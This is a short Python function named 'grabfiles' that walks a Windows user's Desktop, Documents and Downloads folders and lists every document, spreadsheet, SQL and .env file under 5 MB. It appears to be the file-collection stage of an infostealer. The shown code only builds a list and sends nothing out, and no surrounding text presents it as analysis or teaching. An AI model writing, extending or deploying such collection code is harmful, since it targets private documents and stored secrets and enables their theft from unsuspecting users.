def grabfiles():
    grabbed_files = []
    
    extensions = ['.txt', '.doc', '.docx', '.pdf', '.xlsx', '.xls', '.csv', '.sql', '.env']
    
    target_dirs = [
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads')
    ]
    
    for target_dir in target_dirs:
        if os.path.exists(target_dir):
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        src = os.path.join(root, file)
                        try:
                            if os.path.getsize(src) < 5 * 1024 * 1024:
                                grabbed_files.append({
                                    'path': src,
                                    'size': os.path.getsize(src)
                                })
                        except:
                            continue
    
    return grabbed_files
